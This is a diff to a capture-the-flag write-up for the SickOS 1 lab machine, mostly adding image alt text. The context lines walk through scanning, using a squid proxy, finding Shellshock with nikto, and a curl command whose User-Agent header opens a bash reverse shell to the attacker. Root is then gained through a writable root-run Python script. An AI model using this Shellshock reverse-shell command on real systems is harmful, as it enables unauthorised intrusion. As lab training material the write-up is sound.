@@ -34,18 +34,18 @@ I then performed an **nmap** aggressive scan to identify open ports, services ru
 nmap -A -p- TARGET --min-rate 10000 -oN sick1.nmap
 ```
 
-![](https://cdn.ziomsec.com/sickos1/1.webp)
+![performing an nmap scan on sickos-1 machine](https://cdn.ziomsec.com/sickos1/1.webp)
 
 ## Initial Foothold
 
 I accessed the web server on the open port but got an error message. This error page revealed the version of squid server.
 
-![](https://cdn.ziomsec.com/sickos1/2.webp)
+![accessing the web application running on the target](https://cdn.ziomsec.com/sickos1/2.webp)
 
 I googled the **squid** version and found this **hacktricks** article where it referenced a scanner to find open ports:
 - https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid
 
-![](https://cdn.ziomsec.com/sickos1/3.webp)
+![reading about squid exploitation on hacktricks](https://cdn.ziomsec.com/sickos1/3.webp)
 
 Hence, I downloaded the **python** script and ran it to find discover additional ports.
 - https://github.com/aancw/spose
@@ -56,7 +56,7 @@ cd spose
 python spose.py --proxy http://TARGET:SQUID_PORT --target TARGET
 ```
 
-![](https://cdn.ziomsec.com/sickos1/4.webp)
+![downloading and running the exploit](https://cdn.ziomsec.com/sickos1/4.webp)
 
 I then used the **squid** server as proxy and accessed port 80.
 
@@ -64,13 +64,13 @@ I then used the **squid** server as proxy and accessed port 80.
 curl --proxy http://TARGET:3128 http://TARGET:80
 ```
 
-![](https://cdn.ziomsec.com/sickos1/5.webp)
+![accessing port 80 via proxy](https://cdn.ziomsec.com/sickos1/5.webp)
 
 I then set the proxy on my browser and accessed it through the browser.
 
-![](https://cdn.ziomsec.com/sickos1/6.webp)
+![configuring proxy on browser](https://cdn.ziomsec.com/sickos1/6.webp)
 
-![](https://cdn.ziomsec.com/sickos1/7.webp)
+![accessing web app running on port 80](https://cdn.ziomsec.com/sickos1/7.webp)
 
 Since the landing page did not reveal anything, I used **gobuster** to find hidden files.
 
@@ -78,7 +78,7 @@ Since the landing page did not reveal anything, I used **gobuster** to find hidd
 gobuster dir --proxy http://TARGET:3128 -u http://TARGET/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
 ```
 
-![](https://cdn.ziomsec.com/sickos1/8.webp)
+![fuzzing for hidden files on the target](https://cdn.ziomsec.com/sickos1/8.webp)
 
 The *robots.txt* file could contain interesting endpoints, so I accessed it:
 
@@ -86,11 +86,11 @@ The *robots.txt* file could contain interesting endpoints, so I accessed it:
 curl --proxy http://TARGET:3128 http://TARGET/robots.txt
 ```
 
-![](https://cdn.ziomsec.com/sickos1/9.webp)
+![reading the robots.txt file](https://cdn.ziomsec.com/sickos1/9.webp)
 
 I revealed an endpoint leading to *wolf CMS*.
 
-![](https://cdn.ziomsec.com/sickos1/10.webp)
+![accessing wolf cms](https://cdn.ziomsec.com/sickos1/10.webp)
 
 The page did not reveal anything interesting, so I ran a **nikto** scan on the target.
 
@@ -98,7 +98,7 @@ The page did not reveal anything interesting, so I ran a **nikto** scan on the t
 nikto -useproxy http://TARGET:3128 -h http://TARGET
 ```
 
-![](https://cdn.ziomsec.com/sickos1/11.webp)
+![running nikto scan on the target](https://cdn.ziomsec.com/sickos1/11.webp)
 
 The scan identified a **Shellshock** vulnerability on the server.
 
@@ -112,35 +112,35 @@ I referred to the above article and got a reverse shell by exploiting the vulner
 curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/KALI/PORT 0>&1" --proxy http://TARGET:3128 http://TARGET/cgi-bin/status
 ```
 
-![](https://cdn.ziomsec.com/sickos1/12.webp)
+![getting a reverse shell from sickos-1 machine](https://cdn.ziomsec.com/sickos1/12.webp)
 
 ## Privilege Escalation
 
 To perform further enumeration, I downloaded the **linux smart enumeration** script locally and transferred it to the target.
 
-![](https://cdn.ziomsec.com/sickos1/13.webp)
+![starting an http web server](https://cdn.ziomsec.com/sickos1/13.webp)
 
-![](https://cdn.ziomsec.com/sickos1/14.webp)
+![transferring linux smart enumeration tool to the target](https://cdn.ziomsec.com/sickos1/14.webp)
 
 It discovered a python file that was being run by root.
 
-![](https://cdn.ziomsec.com/sickos1/15.webp)
+![running the linux smart enumeration script](https://cdn.ziomsec.com/sickos1/15.webp)
 
 I read the file and found out that it just had few print statements.
 
-![](https://cdn.ziomsec.com/sickos1/16.webp)
+![inspecting the python file](https://cdn.ziomsec.com/sickos1/16.webp)
 
 Since I had write access over it, I added a code block that would get me a reverse shell.
 
-![](https://cdn.ziomsec.com/sickos1/17.webp)
+![adding a payload to the python file](https://cdn.ziomsec.com/sickos1/17.webp)
 
 After the file got executed by root, I got a reverse shell on my listener.
 
-![](https://cdn.ziomsec.com/sickos1/18.webp)
+![getting a reverse shell as root](https://cdn.ziomsec.com/sickos1/18.webp)
 
 Finally I captured the flag from */root* directory.
 
-![](https://cdn.ziomsec.com/sickos1/19.webp)
+![capturing the root flag](https://cdn.ziomsec.com/sickos1/19.webp)
 
 ## Closure
 
